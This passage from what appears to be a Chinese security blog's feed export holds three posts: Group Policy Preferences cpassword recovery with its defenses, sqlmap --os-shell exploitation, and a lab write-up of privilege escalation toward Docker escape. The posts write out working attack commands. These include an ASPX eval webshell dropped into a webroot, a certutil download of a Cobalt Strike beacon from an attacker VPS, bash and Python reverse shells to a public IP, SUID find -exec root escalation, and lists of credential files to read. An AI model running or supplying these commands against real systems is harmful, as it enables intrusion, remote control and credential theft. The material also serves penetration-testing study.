src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084634.png" alt="image-20210116123215490"></p><p>然后完成即可， 这时候使用FTP连接工具即可，连不上通过控制面板，关闭防火墙即可</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084638.png" alt="image-20210116123531384"></p><h3 id="3-2-创建组策略，批量修改域中机器的本地管理员密码"><a href="#3-2-创建组策略，批量修改域中机器的本地管理员密码" class="headerlink" title="3.2 创建组策略，批量修改域中机器的本地管理员密码"></a>3.2 创建组策略，批量修改域中机器的本地管理员密码</h3><h4 id="3-2-1创建组策略"><a href="#3-2-1创建组策略" class="headerlink" title="3.2.1创建组策略"></a>3.2.1创建组策略</h4><p>Win + R 打开运行 ，输入gpmc.msc ，进入组策略管理。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084644.png" alt="image-20210116124142601">         右击<code>组策略</code> —&gt; <code>新建</code>:</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084649.png" alt="image-20210116124834370"></p><p>右击<code>test</code>(刚刚创建好的组策略对象)–&gt;<code>编辑</code>,来到如下位置：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084653.png" alt="image-20210116124949983"></p><p>右击<code>本地用户和组</code>–&gt;<code>新建</code>–&gt;<code>本地用户</code>：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084658.png" alt="image-20210116125418016"></p><p>其中设置的密码为<code>hackyhy.123</code></p><p>回到组策略管理，设置组策略的对象，添加<code>Domain Computers</code>到组策略组中：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084712.png" alt="image-20210116125705664"></p><p>查看组策略对象<code>test</code>的详细信息：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084718.png" alt="image-20210116125821832"></p><p>至此，组策略配置完成，域内主机重新登录。</p><blockquote><p>  管理员在域中新建一个组策略后，操作系统会自动在SYSVO共享目录中生成一个XML文件，即<code>Groups.xml</code>,该文件中保存了该组策略更新后的密码。</p></blockquote><p>根据test的ID 去访问 <code>\\test.yhy\SYSVOL\test.yhy\Policies</code> 或者本地的<code>C:\Windows\SYSVOL\domain\Policies</code>相对应的策略。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084723.png" alt="image-20210116130016932"></p><p>打开，访问<code>\Machine\Preferences\Groups</code>，找到文件<code>Groups.xml</code>，</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084729.png" alt="image-20210116130711551"></p><p>其中的关注点为<code>cpassword</code>: fjomcrwPmyEFuKDFM1WGGDUe8Ap1iGL/RsEuyDABYBI</p><h4 id="3-2-2-漏洞利用"><a href="#3-2-2-漏洞利用" class="headerlink" title="3.2.2 漏洞利用"></a>3.2.2 漏洞利用</h4><p>介绍两种简单的利用方式</p><ul><li>  Kali 下，将cpassword 字段复制到kali中，使用gpp-decrypt 进行破解</li></ul><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084757.png" alt="img"></p><ul><li><p>msf 模块</p><p>  使用msf后渗透模块</p><p>  <code>run post/windows/gather/credentials/gpp</code></p><p>  当拿到目标的session后（这里直接将msf生成的马，通过ftp上传，并执行）</p></li></ul><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084804.png" alt="image-20210116134115737"></p><h2 id="4-组策略首选项提权的防御措施"><a href="#4-组策略首选项提权的防御措施" class="headerlink" title="4. 组策略首选项提权的防御措施"></a>4. 组策略首选项提权的防御措施</h2><p>在用于管理组策略的计算机上安装 KB2962486补丁，防止新的凭据被放置在组策略首选项中。微软在2014年修复了组策略首选项提权漏洞，使用的方法就是不再将密码保存在组策略首选项中。</p><p>此外，针对Everyone访问权限进行设置，具体如下：</p><ol><li> 设置共享文件夹SYSVOL的访问权限</li><li> 将包含组策略密码的 XML 文件从 SYSVOL 目录中删除s</li><li> 不要把密码放在所有域用户都有权访问的文件中 </li><li> 如果需要更改域中机器的本地管理员密码，建议使用LAPS</li></ol>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows提权</tag>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap关于os-shell小记</title>
    <link href="/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/"/>
    <url>/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="SqlMap-–os-shell-利用"><a href="#SqlMap-–os-shell-利用" class="headerlink" title="SqlMap –os-shell 利用"></a>SqlMap –os-shell 利用</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol><li><p>拥有dba权限</p></li><li><p>网站的绝对路径</p></li><li><p>高版本的mysql需要 <code>show variables like &#39;%secure_file_priv%&#39;</code> 或者<code>select </code></p><p> <code>@@secure;</code>或者<code>show global variables like &#39;%secure%&#39;;</code>的结果符合要求，secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。这个参数只能通过修改配置文件后重启mysql修改</p><ul><li>如果该变量为空，则变量无效，这时候最容易利用</li><li>如果变量为目录的绝对路径，则服务器会将导入和导出操作限制为仅适用于该目录中的文件</li><li>如果设置为NULL，则服务器禁用导入和导出操作。</li></ul></li><li><p>当为php时，magic_quotes_gpc为off，php主动转义的功能关闭**</p></li></ol><p>当执行 –os-shell时，这个时候sqlmap主要做了三件事情：</p><ol><li>进行目标的一个基础信息的探测。</li><li>上传shell到目标web网站上（sqlmap会自动生成两个文件，一个用于命令执行，一个用于上传文件）</li><li>退出时删除shell。</li></ol><h3 id="寻找绝对路径"><a href="#寻找绝对路径" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h3><ol><li><p>通过网站报错信息查看绝对路径</p></li><li><p>通过搜索引擎获取</p> <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">google语法：site:<span class="hljs-keyword">baidu.com </span>warning<br><span class="hljs-symbol">site:</span><span class="hljs-keyword">baidu.com </span> <span class="hljs-string">&quot;fatal error&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>配置文件获取路径<br> 如果注入点有文件读取权限，就可以通过load_file函数读取配置文件，再从中寻找路径信息。</p></li></ol><p>  Sqlmap 下可以使用–sql-shell 获取一个sql命令执行窗口，使用load_file(‘文件名’)读取文件</p><p>  也可以使用 –file-read=文件名 ，读取文件</p><p>sqlmap -u ‘url’ –batch –file-read=/etc/httpd/conf/httpd.conf</p><ul><li><p><strong>win 下常见的敏感文件</strong></p><p><a href="https://link.zhihu.com/?target=https://blog.csdn.net/hardhard123/article/details/80062733">常用的绝对路径收集</a></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">c:/boot.ini //查看系统版本 <br>c:/windows/php.ini //php配置信息 <br>c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 <br>c:/winnt/php.ini <br>c:/winnt/my.ini <br>c:<span class="hljs-symbol">\m</span>ysql<span class="hljs-symbol">\d</span>ata<span class="hljs-symbol">\m</span>ysql<span class="hljs-symbol">\u</span>ser.MYD //存储了mysql.user表中的数据库连接密码 <br>c:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\R</span>hinoSoft.com<span class="hljs-symbol">\S</span>erv-U<span class="hljs-symbol">\S</span>ervUDaemon.ini //存储了虚拟主机网站路径和密码 <br>c:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\S</span>erv-U<span class="hljs-symbol">\S</span>ervUDaemon.ini <br>c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\i</span>netsrv<span class="hljs-symbol">\M</span>etaBase.xml 查看IIS的虚拟主机配置 <br>c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\r</span>epair<span class="hljs-symbol">\s</span>am //存储了WINDOWS系统初次安装的密码 <br>c:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\S</span>erv-U<span class="hljs-symbol">\S</span>ervUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此 <br>c:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\R</span>hinoSoft.com<span class="hljs-symbol">\S</span>ervUDaemon.exe <br>C:<span class="hljs-symbol">\D</span>ocuments and Settings<span class="hljs-symbol">\A</span>ll Users<span class="hljs-symbol">\A</span>pplication Data<span class="hljs-symbol">\S</span>ymantec<span class="hljs-symbol">\p</span>cAnywhere<span class="hljs-symbol">\*</span>.cif文件 <br>//存储了pcAnywhere的登陆密码 <br>c:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\A</span>pache Group<span class="hljs-symbol">\A</span>pache<span class="hljs-symbol">\c</span>onf<span class="hljs-symbol">\h</span>ttpd.conf 或C:<span class="hljs-symbol">\a</span>pache<span class="hljs-symbol">\c</span>onf<span class="hljs-symbol">\h</span>ttpd.conf //查看WINDOWS系统apache文件 <br>c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息. <br>c:/Resin/conf/resin.conf/usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机 <br>d:<span class="hljs-symbol">\A</span>PACHE<span class="hljs-symbol">\A</span>pache2<span class="hljs-symbol">\c</span>onf<span class="hljs-symbol">\h</span>ttpd.conf <br>C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\m</span>ysql<span class="hljs-symbol">\m</span>y.ini <br>C:<span class="hljs-symbol">\m</span>ysql<span class="hljs-symbol">\d</span>ata<span class="hljs-symbol">\m</span>ysql<span class="hljs-symbol">\u</span>ser.MYD 存在MYSQL系统中的用户密码<br>c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\p</span>hp.ini      php配置文件<br>c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\i</span>netsrv<span class="hljs-symbol">\M</span>etaBase.xml    IIS虚拟主机配置文件<br></code></pre></td></tr></table></figure></li><li><p><strong>Linux 下常见的敏感文件</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs stata">/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> <span class="hljs-comment">//apache2缺省配置文件 </span><br>/usr/<span class="hljs-keyword">local</span>/apache2/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> <br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/extra/httpd-vhosts.<span class="hljs-keyword">conf</span> <span class="hljs-comment">//虚拟网站设置 </span><br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/php5/lib/php.ini <span class="hljs-comment">//PHP相关设置 </span><br>/etc/sysconfig/iptables <span class="hljs-comment">//从中得到防火墙规则策略 </span><br>/etc/httpd/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> <span class="hljs-comment">// apache配置文件 </span><br>/etc/rsyncd.<span class="hljs-keyword">conf</span> <span class="hljs-comment">//同步程序配置文件 </span><br>/etc/my.cnf <span class="hljs-comment">//mysql的配置文件 </span><br>/etc/redhat-release <span class="hljs-comment">//系统版本 </span><br>/etc/issue <br>/etc/issue.<span class="hljs-keyword">net</span> <br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/php5/lib/php.ini <span class="hljs-comment">//PHP相关设置 </span><br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/extra/httpd-vhosts.<span class="hljs-keyword">conf</span> <span class="hljs-comment">//虚拟网站设置 </span><br>/etc/httpd/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span>或/usr/<span class="hljs-keyword">local</span>/apche/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> 查看linux APACHE虚拟主机配置文件<br>/usr/<span class="hljs-keyword">local</span>/resin-3.0.22/<span class="hljs-keyword">conf</span>/resin.<span class="hljs-keyword">conf</span> 针对3.0.22的RESIN配置文件查看 <br>/usr/<span class="hljs-keyword">local</span>/resin-<span class="hljs-keyword">pro</span>-3.0.22/<span class="hljs-keyword">conf</span>/resin.<span class="hljs-keyword">conf</span> 同上 <br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/extra/httpd-vhosts.<span class="hljs-keyword">conf</span> APASHE虚拟主机查看 <br>/etc/httpd/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span>或/usr/<span class="hljs-keyword">local</span>/apche/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span> 查看linux APACHE虚拟主机配置文件 <br>/usr/<span class="hljs-keyword">local</span>/resin-3.0.22/<span class="hljs-keyword">conf</span>/resin.<span class="hljs-keyword">conf</span> 针对3.0.22的RESIN配置文件查看 <br>/usr/<span class="hljs-keyword">local</span>/resin-<span class="hljs-keyword">pro</span>-3.0.22/<span class="hljs-keyword">conf</span>/resin.<span class="hljs-keyword">conf</span> 同上 <br>/usr/<span class="hljs-keyword">local</span>/<span class="hljs-keyword">app</span>/apache2/<span class="hljs-keyword">conf</span>/extra/httpd-vhosts.<span class="hljs-keyword">conf</span> APASHE虚拟主机查看 <br>/etc/sysconfig/iptables 查看防火墙策略 <br>load_file(<span class="hljs-built_in">char</span>(47)) 可以列出FreeBSD,Sunos系统根目录 <br><span class="hljs-keyword">replace</span>(load_file(0×2F6574632F706173737764),0×3c,0×20) <br><span class="hljs-keyword">replace</span>(load_file(<span class="hljs-built_in">char</span>(47,101,116,99,47,112,97,115,115,119,100)),<span class="hljs-built_in">char</span>(60),<span class="hljs-built_in">char</span>(32))<br>etc/php.ini          php配置文件<br>/etc/httpd/<span class="hljs-keyword">conf</span>.<span class="hljs-keyword">d</span>/php.<span class="hljs-keyword">conf</span><br>/etc/httpd/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span>        Apache配置文件<br>/usr/<span class="hljs-keyword">local</span>/apache/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span><br>/usr/<span class="hljs-keyword">local</span>/apache2/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span><br>/usr/<span class="hljs-keyword">local</span>/apache/<span class="hljs-keyword">conf</span>/extra/httpd-vhosts.<span class="hljs-keyword">conf</span>  虚拟目录配置文件<br></code></pre></td></tr></table></figure></li><li><p><strong>通过执行</strong><code>select @@datadir;</code> 获取数据库数据保存的位置、 <code>select @@basedir;</code> 安装位置、<code>select @@plugin_dir</code> mysql plugin目录</p><p>可能会有一些关键信息，然后对关键信息搜索，查找默认路径    </p></li></ul><h3 id="执行–os-shell"><a href="#执行–os-shell" class="headerlink" title="执行–os-shell"></a>执行–os-shell</h3><p>成功后会在网站绝对路径下，生成两个文件，一个可以上传，一个可以执行命令。</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106105940.png"></p><h2 id="SqlServer"><a href="#SqlServer" class="headerlink" title="SqlServer"></a>SqlServer</h2><h3 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h3><ul><li>数据库支持外连</li><li>数据库权限为SA权限</li></ul><p>Sqlserver –os-shell主要是利用<code>xp_cmdshell</code>扩展进行命令执行。</p><p>当执行–os-shell 时，这个时候sqlmap主要做了三件事情：</p><ol><li>识别当前数据库类型，然后打印出来。</li><li>检测是否为数据库dba，也就是查看是否为sa权限。</li><li>检测是否开启了xp_cmdshell，如果没有开启sqlmap就会尝试开启。</li></ol><h3 id="寻找绝对路径-1"><a href="#寻找绝对路径-1" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h3><p>可以上传一个复杂文件名的文件，比如：l12asd3123_0sads7_08.jpg</p><p>或者在网站中找到一个复杂的文件名，觉得会是唯一的，通过命令查找</p><p>sqlmap  –os-shell 下使用，以下任意一条命令</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">for</span> /r e:<span class="hljs-string">\</span> %i <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>*.php) <span class="hljs-keyword">do</span> @echo %i  *必加<br>dir c:<span class="hljs-string">\</span> d:<span class="hljs-string">\</span>  /s /b | find <span class="hljs-string">&quot;icon_assignment.gif&quot;</span><br></code></pre></td></tr></table></figure><p>查找文件</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110036.png"></p><h3 id="上一句话马或者连cs"><a href="#上一句话马或者连cs" class="headerlink" title="上一句话马或者连cs"></a>上一句话马或者连cs</h3><h4 id="写一句话木马"><a href="#写一句话木马" class="headerlink" title="写一句话木马"></a>写一句话木马</h4><p><code> echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;weshe11b&quot;],&quot;unsafe&quot;);%^&gt; &gt; d:\wwwroot\1azq.aspx</code></p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110059.png"></p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110119.png"></p><h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>使用 <code>certutil.exe -urlcache -split -f http://vpsIP:port/beacon32.exe a32.exe</code></p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110147.png"></p><p>a32.exe 执行， 有时执行不成功饭是因为权限不够，可以下载到有执行权限的目录（假如c:/temp/ ，有权限，<code>certutil.exe -urlcache -split -f http://vpsIP:port/beacon32.exe c:/temp/a32.exe </code></p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110212.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在有拥有dba权限后，</p><ul><li>mysql拿shell的难点在于寻找绝对路径</li><li>sqlserver在于xp_cmdshell 是否开启。</li></ul>]]></content>
    
    
    <categories>
      
      <category>安全工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlmap使用</tag>
      
      <tag>getshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简单dockers逃逸学习</title>
    <link href="/2020/08/04/%E7%AE%80%E5%8D%95docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/"/>
    <url>/2020/08/04/%E7%AE%80%E5%8D%95docker%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="1-目标界面"><a href="#1-目标界面" class="headerlink" title="1. 目标界面"></a>1. 目标界面</h2><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png"></p><p>搞半天，没进去。。。。</p><p>经过提示，了解到了一句话执行的原理，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一句话在每次执行时，接收变量cmd传进去的参数 <code>cmd=phpinfo(); </code> 使用eval函数执行 phpinfo(); 命令。</p><p>了解后就是猜参数名的过程。</p><h2 id="2-提权"><a href="#2-提权" class="headerlink" title="2. 提权"></a>2. 提权</h2><p>连上shell后， <code>whoami</code> 查看为www-data权限，</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2.png"></p><p>通过uname -a 和 cat /etc/*-release 查看内核版本，没有提权exp</p><p>!<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/4.png"></p><p><a href="https://www.anquanke.com/post/id/86979">利用可执行文件SUID</a></p><p>通过命令查看</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/3.png"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">touch suid <span class="hljs-comment"># 也可以不用创建，只要查找的文件真实存在即可</span><br>find suid -<span class="hljs-built_in">exec</span> whoami \;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/5.png"></p><h2 id="3-反弹shell-，以及获取完全交互式shell"><a href="#3-反弹shell-，以及获取完全交互式shell" class="headerlink" title="3. 反弹shell ，以及获取完全交互式shell"></a>3. 反弹shell ，以及获取完全交互式shell</h2><p>公网nc 监听 端口</p><p>bash 反弹 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/公网ip/端口 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>失败。。。</p><p>使用 python 反弹shell 到公网</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;公网ip&quot;,监听的端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-p&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure><p>保存为shll.sh ,之后执行</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/6.png"></p><p>到这里，反弹来的shell还有些问题：</p><ul><li><p>一些命令如su和ssh，需要一个正确的终端才能运行</p></li><li><p>通常不显示STDERR</p></li><li><p>无法正常使用vim等文本编辑器</p></li><li><p>没有完成标签</p></li><li><p>没有向上箭头使用历史</p></li><li><p>没有jobcontrol等</p><p>接下来使用python获取完全交互式shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 接下来在公网的机器上执行</span><br><span class="hljs-meta">$</span><span class="bash"> python -c <span class="hljs-string">&quot;import pty; pty.spawn([&#x27;/bin/bash&#x27;,&#x27;-p&#x27;])&quot;</span></span><br><span class="hljs-meta">#</span><span class="bash"> 启用python交互式</span><br><span class="hljs-meta">#</span><span class="bash"> 把它丢到后台挂起</span><br><span class="hljs-meta">$</span><span class="bash"> ctrl + z</span>   <br><span class="hljs-meta">#</span><span class="bash"> 重置stty，也就意味着你看不到输入的内容</span><br><span class="hljs-meta">$</span><span class="bash"> stty raw -<span class="hljs-built_in">echo</span></span>  <br><span class="hljs-meta">#</span><span class="bash"> 把后台挂起的程序调回前台 ，命令不显示</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">fg</span></span>  <br><span class="hljs-meta">#</span><span class="bash"> 完全刷新终端屏幕</span><br><span class="hljs-meta">$</span><span class="bash"> 回车 ，再回车 两次</span><br><span class="hljs-meta">$</span><span class="bash"> reset</span>  <br><span class="hljs-meta">$</span><span class="bash"> ctrl + c</span><br><span class="hljs-meta">#</span><span class="bash"> 接下来设置环境变量，根据第一步得到的环境变量来设置</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">export</span> SHELL=bash</span>   <br></code></pre></td></tr></table></figure><p>完美了,但是反弹的shell并不是root 用户，接下来执行</p><p>find suid -exec /bin/bash -p ;</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/9.png"></p></li></ul><h2 id="4-docker-逃逸"><a href="#4-docker-逃逸" class="headerlink" title="4. docker 逃逸"></a>4. docker 逃逸</h2><p>  使用 <code>ls -alh /.dockerenv </code> 判断服务器是否为docker环境, 非docker环境是没有的</p><p>  <img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/7.png"></p><p>这是没有docker的</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/13.png"></p><p>或者使用<code>cat /proc/1/cgroup</code>  查看系统进程的cgroup信息</p><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/8.png"></p><p>这是没有的</p><p><img 